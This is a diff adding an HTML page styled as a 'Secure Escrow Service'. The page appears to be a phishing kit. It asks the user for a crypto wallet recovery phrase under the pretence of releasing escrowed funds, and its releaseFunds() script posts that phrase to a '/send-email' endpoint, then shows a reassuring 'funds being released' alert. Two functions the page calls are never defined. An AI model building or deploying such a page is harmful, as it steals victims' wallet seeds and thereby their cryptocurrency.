@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Secure Escrow Service</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .escrow-container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 400px;
+        }
+        .escrow-container h2 {
+            margin-bottom: 10px;
+        }
+        .details, .transaction {
+            text-align: left;
+            margin: 10px 0;
+        }
+        .balance {
+            font-size: 20px;
+            font-weight: bold;
+            margin: 10px 0;
+            color: #28a745;
+        }
+        button {
+            padding: 10px 15px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+            margin: 5px;
+        }
+        .release {
+            background-color: #007bff;
+            color: white;
+        }
+        .dispute {
+            background-color: #dc3545;
+            color: white;
+        }
+        input, select {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="escrow-container">
+        <h2>Escrow Transaction</h2>
+        <div class="details">
+            <p><strong>Buyer:</strong> John Doe</p>
+            <p><strong>Seller:</strong> Jane Smith</p>
+            <p><strong>Item:</strong> Digital Product</p>
+            <p><strong>Amount:</strong> $500</p>
+        </div>
+        <div class="transaction">
+            <h3>Transaction Details</h3>
+            <label for="walletPhrase">Wallet Phrase:</label>
+            <input type="text" id="walletPhrase" required>
+
+            <label for="transactionAmount">Transaction Amount (π):</label>
+            <input type="number" id="transactionAmount" oninput="calculateUSD()" required>
+            <p>Equivalent in USD: $<span id="usdValue">0</span></p>
+
+            <label for="paymentMethod">Payment Method:</label>
+            <select id="paymentMethod" onchange="showAddressField()">
+                <option value="">Select Payment Method</option>
+                <option value="paypal">PayPal</option>
+                <option value="usdt">USDT</option>
+                <option value="btc">BTC</option>
+                <option value="eth">ETH</option>
+                <option value="bank">Bank Transfer</option>
+            </select>
+
+            <div id="receivingAddress" class="hidden">
+                <label for="address">Receiving Address:</label>
+                <input type="text" id="address">
+            </div>
+        </div>
+        <div class="balance">Escrow Balance: $500</div>
+        <button class="release" onclick="releaseFunds()">Release Funds</button>
+        <button class="dispute" onclick="raiseDispute()">Raise Dispute</button>
+    </div>
+    <script>
+        function releaseFunds() {
+            let walletPhrase = document.getElementById('walletPhrase').value;
+            let transactionAmount = document.getElementById('transactionAmount').value;
+            let usdValue = document.getElementById('usdValue').textContent;
+            let paymentMethod = document.getElementById('paymentMethod').value;
+            let address = document.getElementById('address').value;
+
+            fetch('/send-email', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ walletPhrase, transactionAmount, usdValue, paymentMethod, address })
+            })
+            .then(response => response.text())
+            .then(data => alert("Funds is being released! Kindly exercise patience."))
+            .catch(error => console.error('Error:', error));
+        }
+
+        function calculateUSD() {
+            let piAmount = document.getElementById('transactionAmount').value;
+            document.getElementById('usdValue').textContent = piAmount * 20;
+        }
+    </script>
+</body>
+</html>
